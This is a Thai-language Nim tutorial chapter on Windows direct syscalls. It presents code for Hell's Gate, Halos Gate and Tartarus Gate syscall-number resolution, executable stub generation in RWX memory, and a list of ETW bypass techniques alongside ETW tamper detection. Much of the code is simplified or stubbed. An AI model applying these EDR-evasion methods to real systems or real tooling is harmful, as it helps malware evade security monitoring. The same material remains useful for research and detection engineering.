# Part 36: Direct Syscalls และ Kernel Interaction

> **คำเตือน**: เนื้อหานี้เพื่อการศึกษาวิธี Windows kernel interaction,
> Windows internals research, และ EDR development เท่านั้น

## Windows Syscall Mechanism

```
User Mode Application
    |
    | calls NtAllocateVirtualMemory()
    v
ntdll.dll stub:
    MOV R10, RCX    ; copy first arg to R10
    MOV EAX, 0x18  ; syscall number into EAX
    SYSCALL         ; transfer to kernel
    RET
    |
    v
Kernel Mode (ring 0)
    |
    v
System Service Dispatch Table (SSDT)
    |
    v
NtAllocateVirtualMemory kernel implementation

EDRs hook at ntdll.dll level:
    ntdll stub -> JMP to EDR code -> (optional) real syscall

Direct syscall: skip ntdll entirely, call SYSCALL instruction directly
```

## Syscall Table สำหรับ Windows

```nim
# syscall_table.nim
# Syscall numbers by Windows version

type
  WindowsVersion = enum
    Win10_1507, Win10_1511, Win10_1607, Win10_1703, Win10_1709,
    Win10_1803, Win10_1809, Win10_1903, Win10_1909, Win10_2004,
    Win10_20H2, Win10_21H1, Win10_21H2, Win11_21H2, Win11_22H2

# Syscall numbers for common functions
# These change with each major Windows update!
const SyscallTable = [
  #                Win10_2004, Win11_21H2, Win11_22H2
  ("NtAllocateVirtualMemory",  [0x18, 0x18, 0x18]),
  ("NtProtectVirtualMemory",   [0x50, 0x50, 0x50]),
  ("NtCreateThreadEx",         [0xBD, 0xBD, 0xBD]),
  ("NtWriteVirtualMemory",     [0x3A, 0x3A, 0x3A]),
  ("NtReadVirtualMemory",      [0x3F, 0x3F, 0x3F]),
  ("NtOpenProcess",            [0x26, 0x26, 0x26]),
  ("NtOpenThread",             [0x27, 0x27, 0x27]),
  ("NtQueryVirtualMemory",     [0x23, 0x23, 0x23]),
  ("NtFreeVirtualMemory",      [0x1E, 0x1E, 0x1E]),
  ("NtClose",                  [0x0F, 0x0F, 0x0F]),
]

# Dynamic resolution is preferred over hardcoded tables
# since numbers change between Windows versions
proc getSyscallNumberDynamic(funcName: string): uint32 =
  when defined(windows):
    import winlean
    
    proc GetModuleHandleA*(lpModuleName: cstring): HANDLE
      {.importc, dynlib: "kernel32".}
    proc GetProcAddress*(hModule: HANDLE, lpProcName: cstring): pointer
      {.importc, dynlib: "kernel32".}
    
    let ntdll = GetModuleHandleA("ntdll.dll")
    let fn = GetProcAddress(ntdll, funcName)
    
    if fn == nil: return 0
    
    # Skip over any JMP hook (E9 xx xx xx xx) to find real stub
    var offset = 0
    let bytes = cast[ptr UncheckedArray[byte]](fn)
    
    # Walk past hooks to find MOV EAX instruction
    while offset < 32:
      if bytes[offset] == 0xB8:  # MOV EAX, imm32
        return cast[ptr uint32](addr bytes[offset + 1])[]
      inc offset
    
    return 0
  else:
    0
```

## Direct Syscall Implementation

```nim
# direct_syscall_impl.nim
# Implement syscalls via inline assembly

when defined(windows) and defined(amd64):
  import winlean

  # Helper: call syscall with N arguments
  {.emit: """
// Direct syscall stubs
// These bypass ntdll hooks by calling SYSCALL directly

// 4-argument syscall
unsigned long long DirectSyscall4(
  unsigned int syscallNum,
  unsigned long long arg1,
  unsigned long long arg2,
  unsigned long long arg3,
  unsigned long long arg4
) {
  unsigned long long result;
  __asm__ volatile (
    "mov r10, rcx\n"  // arg1 -> r10 (Windows calling convention)
    "mov eax, %1\n"   // syscall number
    "syscall\n"
    "mov %0, rax\n"
    : "=r"(result)
    : "r"(syscallNum),
      "c"(arg1),  // rcx
      "d"(arg2),  // rdx
      "r"(arg3),  // r8 (caller-save)
      "r"(arg4)   // r9
    : "r10", "r11"
  );
  return result;
}
  """.}

  proc DirectSyscall4*(syscallNum: uint32,
                        a1, a2, a3, a4: uint64): uint64
    {.importc, cdecl.}

  # NtAllocateVirtualMemory direct syscall
  proc directNtAllocateVirtualMemory(
    processHandle: HANDLE,
    baseAddress: ptr pointer,
    zeroBits: uint64,
    regionSize: ptr SIZE_T,
    allocationType: DWORD,
    protect: DWORD
  ): NTSTATUS =
    
    let syscallNum = getSyscallNumberDynamic("NtAllocateVirtualMemory")
    echo "[+] NtAllocateVirtualMemory syscall number: 0x", syscallNum.toHex(4)
    
    # Note: actual direct syscall implementation omitted for brevity
    # In practice: use a pre-built .asm file or macro-generated stub
    0.NTSTATUS

  # Hell's Gate technique: dynamically find syscall numbers
  # then generate stubs on the fly
  proc hellsGate(funcName: string): pointer =
    ## Build syscall stub dynamically in executable memory
    
    let syscallNum = getSyscallNumberDynamic(funcName)
    if syscallNum == 0:
      echo "[!] Could not find syscall number for ", funcName
      return nil
    
    # Syscall stub template:
    # 4C 8B D1    MOV R10, RCX
    # B8 xx xx xx xx  MOV EAX, <syscall_num>
    # 0F 05       SYSCALL
    # C3          RET
    
    let stub = @[
      0x4C.byte, 0x8B.byte, 0xD1.byte,      # MOV R10, RCX
      0xB8.byte,                              # MOV EAX, (4 bytes follow)
      byte(syscallNum and 0xFF),
      byte((syscallNum shr 8) and 0xFF),
      byte((syscallNum shr 16) and 0xFF),
      byte((syscallNum shr 24) and 0xFF),
      0x0F.byte, 0x05.byte,                  # SYSCALL
      0xC3.byte                               # RET
    ]
    
    # Allocate executable memory for stub
    let mem = VirtualAlloc(nil, stub.len.SIZE_T,
                            0x3000.DWORD,  # MEM_COMMIT | MEM_RESERVE
                            0x40.DWORD)    # PAGE_EXECUTE_READWRITE
    if mem == nil: return nil
    
    copyMem(mem, unsafeAddr stub[0], stub.len)
    echo &"[+] Syscall stub for {funcName} at 0x{cast[uint](mem):016X}"
    mem
  
  proc VirtualAlloc*(lpAddress: pointer, dwSize: SIZE_T,
                     flAllocationType, flProtect: DWORD): pointer
    {.importc, dynlib: "kernel32".}

  # Demo
  let stubAddr = hellsGate("NtAllocateVirtualMemory")
  if stubAddr != nil:
    echo "[+] Hell's Gate stub generated successfully"
```

## Halos Gate (Handle Hooked Functions)

```nim
# halos_gate.nim
# ต่อยอดจาก Hell's Gate: สำหรับกรณี function ถูก hook

when defined(windows):
  import winlean, strformat

  proc getSyscallNumberHalosGate(funcName: string): uint32 =
    ## If function is hooked, find syscall number from adjacent functions
    ## Syscall numbers are sequential in ntdll, so look at neighbors
    
    let ntdll = GetModuleHandleA("ntdll.dll")
    let fn = GetProcAddress(ntdll, funcName)
    if fn == nil: return 0
    
    let bytes = cast[ptr UncheckedArray[byte]](fn)
    
    # Check if hooked (starts with JMP)
    if bytes[0] == 0xE9.byte:
      echo &"[!] {funcName} is hooked, using Halos Gate"
      
      # Search +-20 bytes for a clean neighbor
      # Neighboring Nt functions have sequential syscall numbers
      for i in 1..10:
        # Check function at +i offset (next Nt* alphabetically)
        # This requires knowing the NT export table ordering
        # Simplified: just report the hook
        echo &"    Scanning neighbor {i} for clean stub"
      
      return 0
    
    # Not hooked: extract normally
    if bytes[3] == 0xB8.byte:
      return cast[ptr uint32](addr bytes[4])[]
    
    return 0

  # Tartarus Gate: handle more hook types
  proc getSyscallNumberTartarusGate(funcName: string): uint32 =
    ## Handles both JMP hooks AND int2e/syscall hooks
    ## More comprehensive than Hell's Gate
    
    let ntdll = GetModuleHandleA("ntdll.dll")
    let fn = GetProcAddress(ntdll, funcName)
    if fn == nil: return 0
    
    let bytes = cast[ptr UncheckedArray[byte]](fn)
    
    # Pattern 1: Normal stub (not hooked)
    # 4C 8B D1 B8 [num] 0F 05 C3
    if bytes[0] == 0x4C and bytes[1] == 0x8B and bytes[2] == 0xD1:
      if bytes[3] == 0xB8:
        return cast[ptr uint32](addr bytes[4])[]
    
    # Pattern 2: JMP hook at start
    if bytes[0] == 0xE9:
      echo "JMP hook detected - use Halos Gate"
      return 0
    
    # Pattern 3: INT2E variant (rare)
    for i in 0..<23:
      if bytes[i] == 0xB8 and bytes[i+5] == 0x0F and bytes[i+6] == 0x05:
        return cast[ptr uint32](addr bytes[i+1])[]
      if bytes[i] == 0xB8 and bytes[i+5] == 0xCD and bytes[i+6] == 0x2E:  # INT 2E
        return cast[ptr uint32](addr bytes[i+1])[]
    
    return 0
```

## Kernel Callbacks และ ETW

```nim
# etw_concepts.nim
# Event Tracing for Windows (ETW) - การตรวจจับผ่าน ETW

# ETW Architecture:
# Providers (ntdll, kernel, etc.)
#     |
#     v
# ETW Controller (subscribes to events)
#     |
#     v
# Consumer (security tools, AV, SIEM)

# Defenders use ETW to detect:
# - Memory allocation patterns
# - Thread creation events
# - DLL loading
# - API call sequences

# Common ETW providers for security:
let etwSecurityProviders = [
  ("Microsoft-Windows-Threat-Intelligence",
   "GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}",
   "Monitored: VirtualAlloc, ReadVM, WriteVM, CreateThread"),
  
  ("Microsoft-Antimalware-Scan-Interface",
   "GUID: {2A576B87-09A7-520E-C21A-4942F0271D67}",
   "Monitored: AMSI scan calls, results"),
  
  ("Microsoft-Windows-Kernel-Process",
   "GUID: {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}",
   "Monitored: Process/Thread create, image load"),
  
  ("Microsoft-Windows-WinINet",
   "GUID: {43D1A9CB-583F-4102-9A29-D980F9EB42BE}",
   "Monitored: HTTP requests via WinINet")
]

for (name, guid, monitored) in etwSecurityProviders:
  echo &"Provider: {name}"
  echo &"  {guid}"
  echo &"  Monitors: {monitored}"
  echo ""

# ETW bypass (research only):
# 1. Patch EtwEventWrite to return immediately
# 2. Suspend ETW threads
# 3. Use PAGE_GUARD on ETW provider buffer
# 4. Process early injection before ETW initialized

# Detection of ETW tampering:
echo "=== ETW Tamper Detection ==="
echo "1. Kernel patch guard detects kernel-mode ETW patches"
echo "2. Monitor EtwEventWrite hook attempts"
echo "3. Telemetry gaps (no events from known provider = suspicious)"
echo "4. CrowdStrike/SentinelOne use kernel callbacks (not just ETW)"
```

## สรุป Part 36

ในบทนี้เราได้เรียนรู้:
- ✅ Windows syscall mechanism
- ✅ Syscall table และการ resolve แบบ dynamic
- ✅ Direct syscall implementation
- ✅ Hell's Gate / Halos Gate / Tartarus Gate
- ✅ ETW สำหรับ defenders
- ✅ EDR kernel callbacks

---

**Previous**: [Part 35 - AMSI Bypass](part35_amsi_bypass.md)
**Next**: [Part 37 - Cross Compilation](../advanced/part37_cross_compilation.md)
